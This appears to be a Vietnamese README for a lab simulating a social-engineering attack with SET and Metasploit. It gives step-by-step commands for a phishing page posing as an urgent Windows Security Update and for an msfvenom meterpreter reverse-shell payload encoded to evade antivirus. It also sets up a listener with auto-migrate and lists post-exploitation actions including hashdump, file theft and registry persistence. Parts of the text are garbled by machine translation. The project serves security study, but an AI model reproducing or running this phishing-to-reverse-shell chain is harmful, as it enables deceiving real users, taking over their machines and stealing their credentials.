Giới thiệu

Đề tài "Tiển khai mô phỏng tấn công Social Engineering use SET Toolkit và Metasploit" xây dựng một môi trường thực thi mục tiêu:


Mô phỏng quy trình tấn công Social Engineering thực tế gồm 2 giai đoạn: Lừa đảo và Khai thác kỹ thuật (Reverse Shell) .
Đánh giá phản ứng của người dùng và hệ điều hành (Windows Defender) trước các kỹ thuật tấn công phổ biến.
Đánh giá khả năng phát hiện của các giải pháp bảo mật hiện có.
Đề xuất các biện pháp phòng vệ: MFA, đào tạo nhận thức, kiểm soát email, Đội Đỏ/Đội Xanh.



🏗️Mô hình hệ thống kiến ​​trúc kiến ​​trúc

<img width="761" height="670" alt="image" src="https://github.com/user-attachments/assets/4747b544-54be-4865-84f5-b96515cbf072" />




🛠️ Công nghệ & Công cụ sử dụng

Công cụđiểm đếnBộ công cụ kỹ thuật xã hội (SET)Mô phỏng tấn công phi kỹ thuật (lừa đảo, thu hoạch thông tin xác thực)Metasploit FrameworkSinh payload, lắng nghe và quản lý shell đảo ngượcmsfvenomTạo tải trọng windows/x64/meterpreter/reverse_tcp(đã được chuẩn bị, mã hóa)Apache2Máy chủ web phân phối trang lừa đảo và tải trọngKali LinuxHệ điều hành tấn công (Attacker)Windows 10 x64Hệ điều hành nạn nhân (Nạn nhân)


🚀 Hướng dẫn phát triển khai

Yêu cầu môi trường


Ubuntu Host (hoặc Kali Linux) với cài đặt Apache2
Metasploit Framework
Máy ảo Windows 10 x64 (ằm trong cùng mạng nội bộ/NAT)
Quyềnsudo


Bước 0 — Cấu hình mạng (nếu Kali chưa có IP)

Cách 1 — Xin IP từ DHCP (thử trước):

<img width="249" height="81" alt="image" src="https://github.com/user-attachments/assets/9d130572-7832-4e69-a3e1-e40bb11cceb5" />


Nếu inet 192.168.x.xxuất hiện → thành công, hãy sử dụng IP đó.

Cách 2 — Nếu DHCP không được cấp, hãy đặt IP tĩnh:

<img width="548" height="216" alt="image" src="https://github.com/user-attachments/assets/b06907f3-b9c7-43e7-8535-9afdaeb3d356" />




Bước 1 — Khởi động Apache & tạo web thư mục

<img width="448" height="222" alt="image" src="https://github.com/user-attachments/assets/951324e4-5852-45eb-a15e-58aea3113ae3" />

sudo systemctl start apache2
sudo systemctl enable apache2

sudo mkdir -p /var/www/html/fb
sudo chmod -R 777 /var/www/html/fb
sudo fuser -k 4567/tcp
Kiểm tra quá trình chạy Apache (phải được tìm thấy Active: active (running)):

đậpsudo systemctl status apache2

Bước 2 — Tạo trang lừa đảo (download.html)

Sử teedụng thay thế nanođể tránh lỗi trong một số trường môi trường:

đập# Terminal 2
sudo tee /var/www/html/fb/download.html << 'EOF'
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="utf-8">
    <title>Windows Security Update</title>
    <style>
        body{font-family:Arial;background:#0f0f0f;color:white;text-align:center;padding:50px}
        .box{max-width:600px;margin:auto;background:#1f1f1f;padding:40px;border-radius:12px;box-shadow:0 0 15px #0078d4}
        button{padding:18px 50px;font-size:20px;background:#0078d4;color:white;border:none;border-radius:8px;cursor:pointer}
        button:hover{background:#106ebe}
    </style>
</head>
<body>
    <div class="box">
        <h1>Windows Update</h1>
        <p><strong>Cap nhat bao mat khan cap</strong></p>
        <p>He thong phat hien lo hong bao mat. Vui long tai va cai dat ngay.</p>
        <a href="setup_windows_update.exe" download>
            <button>TAI VA CAI DAT NGAY</button>
        </a>
        <p style="margin-top:25px;color:#aaa">File: setup_windows_update.exe</p>
    </div>
</body>
</html>
EOF

Kiểm tra tệp đã tạo:

đậpls -lh /var/www/html/fb/

Bước 3 — Tạo payload với msfvenom (được mã hóa)


👉 So sánh cách làm cũ:



Payload cũ (bị AV detect)Payload mới (định nghĩa hơn)Tên tải trọngmeterpreter_reverse_tcpmeterpreter/reverse_tcpLoạiKhông có sân khấu (~7MB)Staged (nhỏ hơn)Mã hóaKhông mã hóaMã hóa 5 lần ( x64/xor_dynamic)năng lượng bị AV phát hiệnCaogiao hàng


⚠️ Thay đổi 192.168.80.135việc thực thi IP của Kali (kiểm tra bằng ip a).



đập# Terminal 2 — chú ý dấu "/" thay vì "_" trong tên payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.80.135 LPORT=4567 \
  -e x64/xor_dynamic -i 5 \
  -f exe \
  --platform windows \
  -a x64 \
  -o ~/setup_windows_update.exe

Sao chép tải trọng vào web thư mục:

đậpsudo cp ~/setup_windows_update.exe /var/www/html/fb/setup_windows_update.exe
sudo chmod 777 /var/www/html/fb/setup_windows_update.exe
ls -lh /var/www/html/fb/


✅ Tệp .exephải có khoảng kích thước 200–400KB . Nếu thấy ~7MB đang sử dụng cũ tải trọng (cấu hình sai).



Bước 4 — Khởi động Listener (Metasploit) với AutoMigrate


⚠️ Terminal 1 phải luôn mở trong suốt quá trình demo. Không đóng hoặc nhấn Ctrl+C.



đập# Terminal 1
msfconsole -q

Trong msfconsole, gõ từng dòng:

use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.80.135
set LPORT 4567
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
exploit -j

Phải thấy dòng:

[*] Started reverse TCP handler on 192.168.80.135:4567

Giải thích:


AutoRunScript migrate: tự động di chuyển tải trọng sang tiến trình khác ( explorer.exe) ngay khi có phiên → tải trọng không bị hủy khi nạn nhân đóng tệp .exe.
ExitOnSession false: handler tiếp tục lắng nghe ngay cả khi đã có session, phục vụ cho nhiều kết nối.


Bước 5 — Thử nghiệm trên máy Windows (Victim)


⚠️ Bắt buộc tắt Windows Defender trước khi chạy file. Đây là yêu cầu của lab môi trường.




Mở trình duyệt → truy cậphttp://192.168.80.135/fb/download.html
Tải tập tinsetup_windows_update.exe
Vào Windows Security → Bảo vệ khỏi virus và mối đe dọa → Quản lý cài đặt
Bảo vệ thời gian thực
Bảo vệ được cung cấp qua đám mây
Gửi mẫu tự động
Tắt Tamper Protection (quan trọng)
Chuột phải vào file → Chạy với tư cách quản trị viên



ℹ️ Sau khi chạy file, có thể thấy cửa sổ cmd flash nhanh rồi biến mất — đây là dấu hiệu bình thường , payload đang di chuyển sang tiến trình khác.



Bước 6 — Kiểm tra phiên

# Trong msfconsole
sessions

Kết quả mong đợi:

Nhận dạngTênKiểuThông tinSự liên quan1meterpreter x64/windowsDESKTOP-XXX\user192.168.80.135 → 192.168.80.X

Vào buổi tập và thao tác:

sessions -i 1

đập# Các lệnh demo cơ bản trong meterpreter
sysinfo
getuid
getpid
ps
pwd
ls


🧩 Hậu khai thác (Sau khai thác)

Lệnhnăng lượngsysinfoXem nhân hệ thống thông tingetuid/getpidXem quyền người dùng & hiện tại PIDpsList List đang chạyscreenshotChụp màn hình máy nhândownload/uploadTải file qua lại giữa 2 máyhashdumpTrích xuất hàm băm mật khẩu (hash)search -f <tên_file>Tìm file trên máy nhân

Ví dụ tìm và đọc file:

đậpsearch -f 123.txt
ls C:\\Users\\Administrator\\Desktop
cat C:\\Users\\Administrator\\Desktop\\123.txt

Persistence — Duy trì kết nối sau khi khởi động lại


Persistence giúp duy trì kết nối sau khi nạn nhân khởi động lại — thường được đề cập trong phần tấn công phân tích của báo cáo.



Cách 1 — Module persistence_exe(chạy trong phiên Meterpreter):

run post/windows/manage/persistence_exe STARTUP=REGISTRY SESSION=1

Cách 2 — Mô-đun persistence(phiên nền trước):

background
use post/multi/manage/shell_to_meterpreter
use exploit/windows/local/persistence
set SESSION 1
set STARTUP REGISTRY
run
